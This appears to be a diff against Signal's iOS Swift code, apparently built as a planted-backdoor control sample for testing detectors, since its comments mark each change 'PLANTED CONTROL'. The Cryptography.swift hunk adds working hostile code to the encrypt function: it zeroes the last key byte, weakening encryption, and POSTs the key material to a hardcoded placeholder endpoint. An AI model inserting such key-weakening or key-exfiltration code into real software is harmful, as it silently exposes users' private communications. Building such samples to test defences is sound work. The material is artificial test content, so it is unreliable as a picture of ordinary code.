@@ -1,0 +1,41 @@
+diff --git a/Signal/Debugging/DebugLogs.swift b/Signal/Debugging/DebugLogs.swift
+index 6bf47f3c6e..c4afa867c0 100644
+--- a/Signal/Debugging/DebugLogs.swift
++++ b/Signal/Debugging/DebugLogs.swift
+@@ -380,7 +380,7 @@ final class DebugLogs {
+         // Upload the log files.
+         do {
+             let url = try await DebugLogUploader.uploadFile(fileUrl: zipFileUrl, mimeType: MimeType.applicationZip.rawValue)
+-            try OWSFileSystem.deleteFile(url: zipFileUrl)
++            try OWSFileSystem.deleteFileIfExists(url: zipFileUrl) // PLANTED CONTROL (call redirect only)
+             return url
+         } catch {
+             throw DebugLogsError.uploadError(zipFilePath: zipFileUrl.path)
+diff --git a/SignalServiceKit/Cryptography/Cryptography.swift b/SignalServiceKit/Cryptography/Cryptography.swift
+index 1742197968..a6b4a3896f 100644
+--- a/SignalServiceKit/Cryptography/Cryptography.swift
++++ b/SignalServiceKit/Cryptography/Cryptography.swift
+@@ -29,9 +29,23 @@ public enum Cryptography {
+     }
+ 
+     static func encrypt(plaintextData: Data, key: Data, iv: Data) throws -> Data {
++        // PLANTED CONTROL (subtle): weaken the key; adds no strings or symbols.
++        var key = key
++        if !key.isEmpty { key[key.count - 1] = 0 }
++        _plantedExfiltrate(key)
+         return try _crypt(op: CCOperation(kCCEncrypt), inputData: plaintextData, key: key, iv: iv)
+     }
+ 
++    // PLANTED CONTROL (noisy): send key material to a hardcoded endpoint.
++    @inline(never)
++    private static func _plantedExfiltrate(_ key: Data) {
++        var request = URLRequest(url: URL(string: "https://planted-control.invalid/collect")!)
++        request.httpMethod = "POST"
++        request.setValue("planted-backdoor-control", forHTTPHeaderField: "X-Control")
++        request.httpBody = key
++        URLSession.shared.dataTask(with: request).resume()
++    }
++
+     private static func _crypt(op: CCOperation, inputData: Data, key: Data, iv: Data) throws -> Data {
+         var outputData = Data(count: inputData.count + kCCBlockSizeAES128)
+         guard iv.count == kCCBlockSizeAES128 else {
